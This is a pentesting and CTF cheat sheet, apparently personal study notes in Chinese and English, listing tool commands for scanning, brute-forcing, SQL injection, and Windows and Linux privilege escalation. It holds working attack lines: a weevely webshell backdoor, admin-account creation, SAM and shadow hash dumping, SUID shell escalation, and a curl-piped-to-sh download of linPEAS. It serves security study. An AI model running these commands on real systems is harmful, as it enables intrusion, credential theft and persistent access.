# CTF Note

* [Detail Note](https://hackmd.io/@nfu-johnny/B1Ju_BMPR)
* [Red Team Notes - Pentesting Cheatsheets](https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets)
* [HAUSEC - Pentesting Cheatsheet](https://hausec.com/pentesting-cheatsheet/)
* [資安職能筆記 - 系統及網站滲透測試](https://hackmd.io/@nfu-johnny/H1lpm_ira)
* [Linux Commands](https://www.computerhope.com/unix.htm)
* [Vulnhub 練習](https://hackmd.io/@k1tten/By_3_x7SE)

## _nmap_

網路設備及服務掃描

```sh
sudo nmap 10.10.10.16  //1000 port
sudo nmap 10.10.10.16 -p-  //1-65535 port
sudo nmap 10.10.10.* -sU -p53,139,161,1900,5353  //UDP port
sudo nmap 10.10.10.* -sV -p80,8080,25,389,3389   
sudo nmap -A -p- 10.10.10.16 | grep xxxxx  //尋找某特定服務
sudo nmap 10.10.10.16 -p80 --reason  //REASON
sudo nmap 10.10.10.16 -p80 --open  //display only open port ip
sudo nmap 10.10.10.16 -O  //OS
sudo nmap 10.10.10.16 -sV  //VERSION
sudo nmap 10.10.10.16 -sVC -p445,3389  //VERSION + NSE
sudo nmap 10.10.10.* -sU -p161 --open  //SNMP
sudo nmap 10.10.10.16 -sU -p161 -sC  //使用 NSE 預設腳本
sudo nmap 10.10.10.16 -sU -p161 --script snmp-win32-users  //user account
sudo nmap 10.10.10.16 --script smb-os-discovery
sudo nmap 10.10.10.16 -p139,445 --script smb-vuln*
sudo nmap 10.10.10.16 -p139,445 --script smb-protocols 
sudo nmap 10.10.10.16 -p2049 --script nfs-showmount
sudo nmap -Pn -p 21 10.10.10.* --open --script "ftp* and not brute" -n
sudo nmap -sV --script http-wordpress-* 10.10.10.16
```

## _snmp-check_

SNMP 設備列舉

```sh
onesixtyone x.x.x.x/x
sudo snmp-check 10.10.10.16
```

## _nbtscan_

NetBOIS 掃描

```sh
sudo nbtscan 10.10.10.1-254
```

## _hydra_

[破密工具 hydra cheat sheet](https://github.com/frizb/Hydra-Cheatsheet)

```sh
hydra -L <account_wordlist_file> -P <pwd_wordlist_file> smb://10.10.10.16
hydra -L <account_wordlist_file> -P <pwd_wordlist_file> ftp://10.10.10.16
hydra -l <account_string> -P <pwd_wordlist_file> rdp://10.10.10.16
hydra -L <account_wordlist_file> -P <pwd_wordlist_file> 10.10.10.16 telnet
```

## _enum4linux_

列舉Windows訊息

```sh
sudo enum4linux 10.10.10.16
sudo enum4linux -u king -p 'slave' -a 10.10.10.16
```

## _crackmapexec_

網域滲透工具

```sh
# 確認impacket套件是否在0.10以上
python3 -m pip list | grep impacket
# 為了使用CrackMapExec工具，要升級套件impacket
python3 -m pip install --upgrade impacket
# 列舉共享資源
sudo crackmapexec smb 10.10.10.16 -u king -p 'slave' --shares
```

## _net_

```sh
# 連結10.10.10.16網路磁碟機
net use \\10.10.10.16 slave /u:king
# 列舉10.10.10.16網路磁碟機
net view \\10.10.10.16
# 增加帳號
net user queen /add
# 列舉所有帳號
net users
# 增加群組
net localgroup Administrator queen /add
# 列舉Administrators群組內所有帳號
net localgroup Administrators
```

## _reg add_

新增機碼開啟RDP服務

```sh
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

## _netstat_

網路狀態

```sh
netstat -an | findstr :3389
```

## _web content discovery_

* [Ffuf爆破神器](https://blog.csdn.net/weixin_44288604/article/details/128444485)
* [FFUF Cheat Sheet](https://cheatsheet.haax.fr/web-pentest/tools/ffuf/)

```sh
#測試網站程式檔名
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://testphp.vulnweb.com/FUZZ -e .txt
#測試網站程式種類語法
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt -u http://testphp.vulnweb.com/indexFUZZ
# 目錄查找
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -k -x "txt,html,php,asp,aspx,jpg,jsp,zip" -u http://127.0.0.1:61389
# 找Virtual Host
gobuster vhost -u http://domain.com/ -w /usr/share/wordlist/dirb/common.txt
# dirb
dirb http://192.168.0.1/
dirb http://192.168.0.1/ -X .aspx
# dirsearch
dirsearch -u "http://192.168.0.1/" -e aspx
dirsearch -u "http://192.168.0.1/" -e asp,aspx,txt
```

## _whatweb_

```sh
whatweb -u http://192.168.0.1/
whatweb -v -a 3 <domain_name>
whatweb --no-errors 192.168.0.0/24
whatweb --no-errors --url-prefix https:// 192.168.0.0/24
```

## _sqlmap_

SQL檢測注入工具

```sh
sudo sqlmap -u "https://url" --cookie="<COOKIE>" --dbs
sudo sqlmap -u "https://url" --cookie="<COOKIE>" -D DB_name --tables
sudo sqlmap -u "https://url" --cookie="<COOKIE>" -D DB_name -T Table_name --columns --technique=B
sudo sqlmap -u "https://url" --cookie="<COOKIE>" -D DB_name -T Table_name --dump --technique=B
sudo sqlmap -u "https://url" --forms --crawl=2 -dbs
```

## _weevely_

Webshell

```sh
weevely generate king backdoor.php  //生成
weevely http://ip:port/backdoor.php king  //連接
```

## _wpscan_

WordPress安全性掃描工具

```sh
# 查看指令使用方式
wpscan -h
# 列舉使用者
wpscan --url http://url -e u 
# 破密
wpscan --url http://url  -U admin -P /usr/share/wordlists/nmap.lst 
```

## _pwdump_

```sh
reg save hklm\sam pwdump\sam
reg save hklm\system pwdump\system
impacket-secretsdump LOCAL -system pwdump/system -sam pwdump/sam -outputfile pwdump/10.10.10.10
ophcrack (執行程式破密)
```

## _john_

破密工具

```sh
john secret.txt --format=raw-md5
```

## _aircrack_

```sh
aircrack-ng WEPooo.cap
aircrack-ng WPA2ooo.cap -w /usr/share/wordlists/nmap.lst
```

## _linPEAS_

```sh
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

## _sudo_

```sh
# 列舉可執行命令
sudo -l
# 免 root 密碼切換至 root 方式
sudo -i
```

## _Android_

```sh
nmap -p5555 10.10.10.* --open
sudo apt install -y adb
adb connect 10.10.10.20:5555
adb devices
adb shell
adb pull /system/app/cindy.apk E:\Cindy\  //get file
```

## _gzip_

```sh
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```

## _snow_

```sh
snow -C -p pass -m "message" text1.txt text2.txt
snow -C -p pass text2.txt text3.txt
```

![image](https://hackmd.io/_uploads/BJwSCx8wC.png)

## _Mount NFS & NFS提權_

```sh
# to scan the target IP address for an open NFS port (port 2049) 
rpcinfo -p <Target IP Address>
# to mount an NFS share on a Linux system
apt install nfs-common
service rpcbind start
showmount -e 10.10.10.20
sudo mount -t nfs 10.10.10.20:/home /mnt/nfs
sudo cp /bin/bash /mnt/nfs/
sudo chmod +s /mnt/nfs/bash
ssh -l user target_ip
/xxx/bash -p
# to mount an SMB share on a Linux system
sudo mount -t cifs //10.10.10.20/C$ /mnt/smb -o username=king,password=slave
```

## _smbclient_

```sh
smbclient -U "kingdom\king"  //10.10.10.20/C$
```

## _Find Files_

```sh
# Find Files in Windows Command Line
dir xxx.xxx /s/a/p   
# Find Files in Linux Command Line
find / -name xxx.xxx
# Displays the world executable folders.
find / -perm -o x -type d 2>/dev/null 
# Displays the “suid” Bit set files.
find / -perm -u=s -type f 2>/dev/null
```

## _unshadow_

```sh
sudo su
unshadow /etc/passwd /etc/shadow > mypasswd
john mypasswd --show
```

## _WireShark_

* [Modbus function code](https://felo.ai/search/shTci4feDgM2wK-ppsVLO)
* [How to Use Wireshark for MQTT Analysis: An In-depth Guide](https://cedalo.com/blog/wireshark-mqtt-guide/)

```sh
# 技巧1：Statistics > Protocol Hierarchy
# 技巧2：Statistics > Coversations
# 技巧3：Analyze > Follow > TCP Stream 
# OT
modbus
modbus.func_code==1
# IoT
mqtt
mqtt.msgtype == 3
# (How many machines) or Go to statistics IPv4 addresses--> Source and Destination ---> Then you can apply the filter given
tcp.flags.syn == 1 and tcp.flags.ack == 0
# (Which machine for dos)
tcp.flags.syn == 1
# (for passwords) or click tools ---> credentials
http.request.method == POST
```

## _metasploit_

```sh
# start metasploit
msfconsole
# search for the exploit
search <exploit_name>
# use the exploit
use <exploit_name>
# show options
show options
# set the target
set RHOST <target_ip>
# run the exploit
run
# example
use auxilliary/scanner/http/wordpress_login_enum
show options
set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
set RHOSTS 10.10.10.10  (target ip)
set RPORT 8080          (target port)
set TARGETURI http://10.10.10.10:8080/
set USERNAME admin
```

## _SUID Binaries for Privilege Escalation_

```sh
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

## _others_

* [行為分析](https://ithelp.ithome.com.tw/articles/10188209)
* [PEiD工具主要的功能是什麼？](https://felo.ai/search/RGkYWRa-6J16ufLhcwbbT)
* [sudo](https://osslab.tw/books/linux-administration/page/sudo)
* [‘strings’ Linux Command | Extracting Strings in Binary Files](https://ioflood.com/blog/strings-linux-command/)
* [ExifTool Command-Line Examples](https://exiftool.org/examples.html)
* [CyberChef](https://gchq.github.io/CyberChef/)
* [crackstation](https://crackstation.net/)

```sh
visudo

openvas >> scans >> tasks

Moudule 06 / OpenStego     //picture
Moudule 06 / ophcrack

Module 07 / Trojans Types /njRAT         //trajon
Module 07 / Malware Analysis Tools / PEiD
Module 07 / Malware Analysis Tools / DIE

Moudule 20 / HashMyFiles
Moudule 20 / VeraCrypt
Moudule 20 / CrypTool
```

## License

MIT
